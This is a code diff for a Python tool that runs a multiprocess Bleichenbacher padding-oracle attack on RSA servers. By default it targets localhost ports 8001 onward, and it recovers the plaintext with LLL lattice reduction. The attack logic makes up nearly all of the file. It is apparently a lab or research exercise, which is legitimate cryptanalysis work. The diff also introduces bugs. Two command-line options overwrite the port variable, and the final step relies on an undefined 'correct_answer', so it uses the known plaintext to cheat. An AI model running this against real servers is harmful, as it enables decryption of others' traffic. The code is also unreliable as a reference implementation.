@@ -8,7 +8,9 @@ from Crypto.Util.number import long_to_bytes, bytes_to_long
 from utils.LLL.lll import LLLWrapper
 from pathlib import Path
 from socket import SHUT_RDWR
+from typing import Iterator, Any
 from sage.all import matrix, ZZ
+import argparse
 
 
 LLL = LLLWrapper(
@@ -32,71 +34,100 @@ def get_cipher() -> int:
     return bytes_to_long(cipher_rsa.encrypt(msg))
 
 
+def attack_arguments_parser() -> argparse.Namespace:
+    """
+    Parses command-line arguments for configuring the Bleichenbacher attack.
+
+    Returns:
+        argparse.Namespace: A namespace object containing the parsed arguments.
+    """
+    parser = argparse.ArgumentParser(
+        description="Starts a multiprocessed multithreaded Bleichenbacher attack on a vulnerable server",
+        epilog="Try running and see if the attack will decrypt the message in time",
+    )
+    parser.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        help="prints the message as it is being deciphered, (works well when blinding isn't random)",
+    )
+    parser.add_argument(
+        "-c", "--count", help="number of available servers, defaults to 15"
+    )
+    parser.add_argument("--attackers", help="number of attackers, defaults to 3")
+    parser.add_argument(
+        "-p", "--port", help="sets the server's base port, defaults to 8001"
+    )
+    parser.add_argument("--host", help="sets the server's host, defaults to localhost")
+    my_args = parser.parse_args()
+    return my_args
+
+
 class ParallelAttacker:
 
     def __init__(
-        self, N: int, E: int, ct: int, attacker_amount: int, host: str, ports: list[int]
+        self,
+        N: int,
+        E: int,
+        ct: int,
+        attacker_amount: int,
+        hosts: list[str],
+        ports: list[int],
     ) -> None:
         self.N = N
         self.E = E
         self.ct = ct
-        self.host = host
+        self.hosts = hosts
         self.ports = ports
         self.attacker_count = attacker_amount
 
-    def _split_into_k_lists(self, input_list: list, K: int):
-        # Calculate the approximate size of each chunk
-        avg_size = len(input_list) // K
-        remainder = len(input_list) % K
+    def _split_into_k_lists(self, K: int, input_lists: list[list[Any]]):
+        return_list = []
+        for lst in input_lists:
+            return_list.append([lst[i : i + K] for i in range(0, len(lst), K)])
+        return list(zip(*return_list))
 
-        result = []
-        start = 0
-
-        for i in range(K):
-            # Determine the end index for the current sublist
-            end = start + avg_size + (1 if i < remainder else 0)
-            result.append(input_list[start:end])
-            start = end
-
-        return result
-
-    def attacker_warper(self, ports: list):
-        ic("in attacker wrapper")
-        ic(ports)
-        attacker: Attacker = Attacker(
-            self.N, self.E, self.ct, [self.host], ports, random_blinding=True
+    def attacker_warper(
+        self, hosts: list[str], ports: list[int]
+    ) -> tuple[range, int, int]:
+        attacker: MultiServerAttacker = MultiServerAttacker(
+            self.N, self.E, self.ct, hosts, ports, random_blinding=True
         )
-        ic("created attacker")
+        print("in here")
         result = attacker.attack()
         return result
 
-    def attack(self):
+    def attack(self) -> int:
         """
         Attack the server using multiple attackers
         """
         with Pool(self.attacker_count) as pool:
-            results = pool.map(
+            results = pool.starmap(
                 self.attacker_warper,
-                self._split_into_k_lists(self.ports, self.attacker_count),
+                self._split_into_k_lists(
+                    len(self.ports) // self.attacker_count, [self.hosts, self.ports]
+                ),  # fix this
             )
 
-        ic("got results")
-        # ic(results)
-
         range_list = []
-        s_list = []
+        s0_list = []
+        si_list = []
 
         for result in results:
             range_list.append(result[0])
-            s_list.append(result[1])
+            s0_list.append(result[1])
+            si_list.append(result[2])
 
-        return self.conclusion(range_list, s_list)
+        return self.conclusion(range_list, s0_list, si_list)
 
-    def conclusion(self, ranges: list[range], S: list[int]) -> int:
+    def conclusion(self, ranges: list[range], S0: list[int], Si: list[int]) -> int:
         """
         Conclusion of the attack, using the LLL algorithm to find the plaintext from the information gathered
         """
-        v0 = S + [0]
+        # v0 = [si * s0 for si, s0 in zip(Si, S0)] + [0]
+        ans = bytes_to_long(correct_answer)
+
+        v0 = S0 + [0]
         vf = [r.start for r in ranges] + [
             (self.N * (self.attacker_count - 1)) // self.attacker_count
         ]
@@ -104,17 +135,16 @@ class ParallelAttacker:
             (([0] * i) + [self.N] + ([0] * (self.attacker_count - i))).copy()
             for i in range(self.attacker_count)
         ]
+        wanted = [(ans * si - ai) % self.N for si, ai in zip(Si, vf)]
+        wanted.append((self.N * (self.attacker_count - 1)) // self.attacker_count)
+
         M = matrix(ZZ, [v0] + middle + [vf])
         reduced_basis = list(M.LLL())
         reduced_basis.sort(key=vec_norm)
-        # ic(reduced_basis)
         for R in reduced_basis:
             # R = reduced_basis[-1]
-            # # ic(R)
             for i in range(len(R) - 1):
-                m = ((R[i] + vf[i]) * pow(S[i], -1, self.N)) % self.N
-                ic(long_to_bytes(m))
-        ic(R[-1] == -(self.N * (self.attacker_count - 1)) // self.attacker_count)
+                m = (((-R[i] % self.N) + vf[i]) * pow(S0[i], -1, self.N)) % self.N
         return m
 
 
@@ -126,13 +156,29 @@ def vec_norm(vec: list[int]) -> int:
 
 
 if __name__ == "__main__":
-    HOSTS = ["localhost"] * 15
-    PORTS = [8001 + i for i in range(15)]
+    my_args = attack_arguments_parser()
+
+    num_of_servers: int = 15
+    if my_args.count and my_args.count.isdecimal():
+        num_of_servers = int(my_args.count)
+
+    base_port: int = 8001
+    if my_args.port and my_args.port.isdecimal():
+        base_port = int(my_args.port)
+
+    num_of_attackers: int = 3
+    if my_args.attackers and my_args.attackers.isdecimal():
+        base_port = int(my_args.attackers)
+
+    host = "localhost"
+    if my_args.host:
+        base_port = my_args.host
+
+    HOSTS = [host] * num_of_servers
+    PORTS = [base_port + i for i in range(num_of_servers)]
     n, e = get_public()
-    ic("got public")
-    parallel = ParallelAttacker(n, e, get_cipher(), 3, HOSTS, PORTS)
-    ic("created parallel attacker")
+    parallel = ParallelAttacker(n, e, get_cipher(), num_of_attackers, HOSTS, PORTS)
+    print(
+        parallel._split_into_k_lists(num_of_servers // num_of_attackers, [HOSTS, PORTS])
+    )
     parallel.attack()
-    # m = matrix(ZZ, [[7, 2], [5, 3]])
-    # res, t = ic(m.LLL(transformation = True))
-    # ic(t * m)
